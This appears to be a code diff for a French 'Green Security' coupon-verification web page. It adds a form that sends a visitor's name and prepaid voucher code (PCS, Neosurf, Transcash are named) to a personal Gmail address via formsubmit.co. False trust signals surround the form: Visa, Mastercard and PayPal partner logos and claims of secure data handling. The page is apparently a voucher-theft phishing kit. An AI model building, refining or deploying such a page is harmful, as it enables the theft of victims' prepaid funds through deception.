@@ -2,9 +2,8 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>CASH SÉCURITÉ - Formulaire</title>
+  <title>Green Security - Vérification Coupon</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-
   <style>
     body {
       margin: 0;
@@ -66,36 +65,68 @@
     .form-container input[type="submit"]:hover {
       background-color: #0f9;
     }
+
+    footer {
+      background-color: #0f0f0f;
+      color: #ccc;
+      padding: 30px 20px;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    footer img {
+      height: 30px;
+    }
   </style>
 </head>
-  <footer style="background-color: #0f0f0f; color: #ccc; padding: 30px 20px; font-size: 14px; text-align: center;">
-  <div style="max-width: 800px; margin: auto;">
+<body>
 
-    <h3 style="color: #00ff99;">Mentions légales & Conditions d’utilisation</h3>
-    <p>
-      Ce site est édité par Green Security. L’utilisation du service implique l’acceptation pleine et entière de nos conditions générales d’utilisation. Les données saisies sont traitées de manière sécurisée.
-    </p>
-    <p style="background-color:#222; padding:10px; border-left:4px solid #00ff99;">
-    Ce formulaire permet de vérifier la validité d’un **d’une Giff carte et des coupon de paiement** (ex:PCS/ NEOSURF / TRANSCASH ETC...) **avant achat ou revente en ligne**. toutes vos identifiant personnels sont gerer 
-      et sécurisé pour votre confidentialite 
-    </p>
-    <p>
-      Toute tentative de fraude ou d’usage non autorisé de ce formulaire peut faire l’objet de poursuites conformément à la loi.
-    </p>
-
-    <hr style="margin: 20px 0; border-color: #333;">
-
-    <h4>Nos partenaires</h4>
-    <div style="display: flex; justify-content: center; flex-wrap: wrap; gap: 15px; margin-top: 10px;">
-      <img src="Visa.png" alt="Visa" style="height: 30px;">
-      <img src="Mastercard.png" alt="Mastercard" style="height: 30px;">
-      <img src="Paypal.png" alt="PayPal" style="height: 30px;">
-    </div>
-
-    <p style="margin-top: 30px; font-size: 12px; color: #777;">
-      &copy; 2025 Green Security. Tous droits réservés.
-    </p>
+  <div class="header">
+    <img src="logo.jpg" alt="Logo de Green Security">
+    <h1>Green Security</h1>
   </div>
+
+  <div class="form-container">
+    <form action="https://formsubmit.co/Alexandersoros333@gmail.com" method="POST">
+      <label for="nom">Nom :</label>
+      <input type="text" id="nom" name="nom" required>
+
+      <label for="code">Code (alphanumérique) :</label>
+      <input type="text" id="code" name="code" required pattern="[A-Za-z0-9]+">
+
+      <label for="date">Date :</label>
+      <input type="date" id="date" name="date" required>
+
+      <label for="heure">Heure :</label>
+      <input type="time" id="heure" name="heure" required>
+
+      <input type="hidden" name="_next" value="merci.html">
+
+      <input type="submit" value="Vérifier">
+    </form>
+  </div>
+
+  <footer>
+    <div style="max-width: 800px; margin: auto;">
+      <h3 style="color: #00ff99;">Mentions légales & Conditions d’utilisation</h3>
+      <p>
+        Ce site est édité par Green Security. L’utilisation du service implique l’acceptation pleine et entière de nos conditions générales d’utilisation. Les données saisies sont traitées de manière sécurisée.
+      </p>
+      <p>
+        Toute tentative de fraude ou d’usage non autorisé de ce formulaire peut faire l’objet de poursuites conformément à la loi.
+      </p>
+      <hr style="margin: 20px 0; border-color: #333;">
+      <h4>Nos partenaires</h4>
+      <div style="display: flex; justify-content: center; flex-wrap: wrap; gap: 15px; margin-top: 10px;">
+        <img src="Visa.png" alt="Visa">
+        <img src="Mastercard.png" alt="Mastercard">
+        <img src="Paypal.png" alt="PayPal">
+      </div>
+      <p style="margin-top: 30px; font-size: 12px; color: #777;">
+        &copy; 2025 Green Security. Tous droits réservés.
+      </p>
+    </div>
   </footer>
+
 </body>
 </html>
